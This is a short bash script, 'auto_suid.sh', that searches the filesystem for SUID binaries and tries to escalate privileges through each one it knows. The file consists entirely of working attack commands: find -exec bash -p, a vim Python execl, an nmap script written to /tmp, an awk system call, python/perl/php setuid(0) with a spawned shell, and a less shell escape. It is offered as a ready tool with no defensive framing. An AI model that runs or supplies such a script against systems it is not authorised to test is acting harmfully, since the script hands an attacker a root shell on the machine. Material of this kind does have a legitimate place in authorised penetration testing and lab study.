#!/bin/bash
# auto_suid.sh - Automatically exploit SUID binaries
# USAGE: ./auto_suid.sh

echo "[*] Scanning for SUID binaries..."
find / -perm -4000 -type f 2>/dev/null | while read binary; do
    echo "[*] Checking: $binary"
    
    case $(basename "$binary") in
        "find")
            echo "[+] Exploiting find..."
            $binary . -exec /bin/bash -p \; -quit
            ;;
        "vim"|"vi")
            echo "[+] Exploiting vim..."
            $binary -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
            ;;
        "bash")
            echo "[+] Exploiting bash..."
            $binary -p
            ;;
        "nmap")
            echo "[+] Exploiting nmap..."
            echo 'os.execute("/bin/bash")' > /tmp/shell.nse
            $binary --script=/tmp/shell.nse
            ;;
        "less"|"more")
            echo "[+] Exploiting $(basename "$binary")..."
            $binary /etc/passwd
            echo "Type '!/bin/bash' after less opens"
            ;;
        "awk")
            echo "[+] Exploiting awk..."
            $binary 'BEGIN {system("/bin/bash -p")}'
            ;;
        "python"|"python3"|"python2")
            echo "[+] Exploiting $(basename "$binary")..."
            $binary -c 'import os; os.setuid(0); os.system("/bin/bash")'
            ;;
        "perl")
            echo "[+] Exploiting perl..."
            $binary -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
            ;;
        "php")
            echo "[+] Exploiting php..."
            $binary -r "posix_setuid(0); system('/bin/bash');"
            ;;
        *)
            echo "[-] No auto-exploit for $(basename "$binary")"
            ;;
    esac
done
